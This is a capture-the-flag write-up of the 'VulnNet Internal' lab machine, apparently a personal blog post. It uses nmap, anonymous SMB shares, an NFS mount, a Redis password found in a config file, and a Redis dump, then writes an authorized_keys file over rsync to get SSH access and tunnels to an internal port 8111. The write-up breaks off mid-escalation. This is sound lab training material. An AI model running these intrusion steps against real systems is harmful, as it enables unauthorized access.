---
layout: default
title : muzec - VulnNet Internal Writeup
---

![image](https://user-images.githubusercontent.com/69868171/117644973-0be92800-b158-11eb-8763-22e426da1bd4.png)

VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings.

    Difficulty: Easy/Medium
    Operating System: Linux

This machine was designed to be quite the opposite of the previous machines in this series and it focuses on internal services. It's supposed to show you how you can retrieve interesting information and use it to gain system access. Report your findings by submitting the correct flags. 

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Mon May 10 03:22:51 2021 as: nmap -sC -sV -oA nmap 10.10.174.95
Nmap scan report for 10.10.174.95
Host is up (0.59s latency).
Not shown: 992 closed ports
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
111/tcp  open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33966/udp6  mountd
|   100005  1,2,3      48735/tcp6  mountd
|   100005  1,2,3      57104/udp   mountd
|   100005  1,2,3      60145/tcp   mountd
|   100021  1,3,4      34733/tcp   nlockmgr
|   100021  1,3,4      37755/tcp6  nlockmgr
|   100021  1,3,4      41102/udp6  nlockmgr
|   100021  1,3,4      46449/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp  open     rsync       (protocol version 31)
2049/tcp open     nfs_acl     3 (RPC #100227)
8021/tcp filtered ftp-proxy
9090/tcp filtered zeus-admin
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h20m08s, deviation: 1h09m15s, median: 3h00m07s
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2021-05-10T12:39:18+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-10T10:39:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 10 03:39:32 2021 -- 1 IP address (1 host up) scanned in 1000.27 seconds
```
So we have ports open probably like 6 if am right ok let begin since we have smb open also let try it first checking for smb shares we have anonymous access to them.

`smbclient -L //10.10.174.95/ -N `


![image](https://user-images.githubusercontent.com/69868171/117648126-d9412e80-b15b-11eb-8c32-de81f0dbe19a.png)


We have one share we can easily access it with the commands below;

`smbclient  //10.10.174.95/shares -N`

![image](https://user-images.githubusercontent.com/69868171/117648196-ecec9500-b15b-11eb-8fc0-43b3d04cfab6.png)


And we are in.

![image](https://user-images.githubusercontent.com/69868171/117648276-04c41900-b15c-11eb-8a9d-bb89af31776a.png)

Checking the temp folder we found the first flag `services.txt` and moving to the data folder some txt file but not that useful to me just some random messages.

![image](https://user-images.githubusercontent.com/69868171/117648536-55d40d00-b15c-11eb-9517-2794bc990d6b.png)

Now going back to the scanning checking through the port i can see we have port 2049 NFS open, NFS port 2049 It is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory.

![image](https://user-images.githubusercontent.com/69868171/117649228-443f3500-b15d-11eb-8f08-04f607c92825.png)

How to Mount it:

1. showmount -e 10.10.174.95
2. mkdir /tmp/NFS
3. mount -t nfs 10.10.174.95:/opt/conf /tmp/NFS
4. df -k

Now we can easily access the mount folder now.

![image](https://user-images.githubusercontent.com/69868171/117649479-91bba200-b15d-11eb-96f3-b3fe89862df2.png)

Now since we have redis port open am checking the folder maybe we can get a credentials for it to log into redis, so we have some conf file of redis let check it.

![image](https://user-images.githubusercontent.com/69868171/117649924-173f5200-b15e-11eb-986c-019a84212cce.png)

And we have a password time to enumerate redis port 6379 .

![image](https://user-images.githubusercontent.com/69868171/117650301-8b79f580-b15e-11eb-9d5b-20e200b0fc59.png)

Typing `info` give use the active databases on redis time to dump it.

![image](https://user-images.githubusercontent.com/69868171/117650422-ac424b00-b15e-11eb-87eb-ab2d7fbbbe6a.png)

![image](https://user-images.githubusercontent.com/69868171/117650683-04794d00-b15f-11eb-86bb-bf6c1d1676dc.png)

`redis-dump -u 10.10.174.95 -a Password > db_full.json`

So we have the `internal flag` with some base64 strings let decode it.

![image](https://user-images.githubusercontent.com/69868171/117650905-4609f800-b15f-11eb-9f43-dcaa07b92165.png)

And we have the decoded strings with some new password.

![image](https://user-images.githubusercontent.com/69868171/117651079-84071c00-b15f-11eb-8d99-a0b10324889a.png)

rsync Ok let explain what is rsync? rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files. It is commonly found on Unix-like operating systems. Rsync is written in C as a single threaded application. thanks Wikipedia .

### Rsync Useage .

`rsync runs on port 873`

![image](https://user-images.githubusercontent.com/69868171/117651766-51115800-b160-11eb-8784-49bd2426f545.png)

`rsync -a rsync://rsync-connect@10.10.174.95/` 

Boom we can see a files in the home directory now let try to get it onto our system.

`rsync -a rsync://rsync-connect@10.10.174.95/files ./rsync` 

![image](https://user-images.githubusercontent.com/69868171/117652296-ff1d0200-b160-11eb-814e-e9f1d37b0a60.png)

So we have to give it time for it to transfer.

![image](https://user-images.githubusercontent.com/69868171/117652941-caf61100-b161-11eb-99a7-401c394b077d.png)

And it ready let change directory.

![image](https://user-images.githubusercontent.com/69868171/117653064-f678fb80-b161-11eb-90e0-4a41008316a4.png)

And we have `user.txt` also a cool ssh folder hahahahahaha but checking the ssh folder it was empty so sad .

![image](https://user-images.githubusercontent.com/69868171/117653215-1f998c00-b162-11eb-89ca-bbd346d5f9b8.png)

Going around so since we can use use `rsync` to transfer files out i guess we can also use it to transfer file in probably ssh authorized_keys . So i generate a SSH keys with ` ssh-keygen -t rsa`

![image](https://user-images.githubusercontent.com/69868171/117653988-2379de00-b163-11eb-9100-7b8ae6741878.png)

So i rename the id_rsa.pub to authorized_keys now time to get it onto the target.

`rsync -av authorized_keys rsync://rsync-connect@10.10.174.95:/files/sys-internal/.ssh`

![image](https://user-images.githubusercontent.com/69868171/117654358-a4d17080-b163-11eb-8631-f58637e2fb80.png)

Boom and we have it transfer, time to SSH into the machine with the private key we have.

1. we have to give the private key a permission `chmod 600 id_rsa`
2. we have the username which is `sys-internal`
3. Let hit SSH

`ssh -i id_rsa sys-internal@10.10.174.95`

![image](https://user-images.githubusercontent.com/69868171/117654931-6ab49e80-b164-11eb-9ea6-9a5de6c51bd5.png)

And we are in awesome but the journey is not yet completed.

### Privilege Escalation

I always check what ports is running if i get access to a machine but `netstat` was missing on the target so i try using `ss -tulpn | grep LISTEN` .

![image](https://user-images.githubusercontent.com/69868171/117655454-18c04880-b165-11eb-9a42-e195ea6f0cfd.png)

Hmmm port 8111 look interesting now let set up SSH Tunneling (Port Forwarding) .

![image](https://user-images.githubusercontent.com/69868171/117655768-80769380-b165-11eb-8a07-db1f48533168.png)

`ssh -i id_rsa -L 8111:localhost:8111 sys-internal@10.10.174.95`

Now let visit `localhost:8111` to confirm it.

![image](https://user-images.githubusercontent.com/69868171/117656607-8e78e400-b166-11eb-94e7-79ec757e877d.png)

So i click on Log in as a Super user to create an administrator account. 

![image](https://user-images.githubusercontent.com/69868171/117659974-98044b00-b16a-11eb-88e2-41288cf36e1e.png)

So we need  Authentication token: before we can get access with the Super user now go back to the target machine to find it.

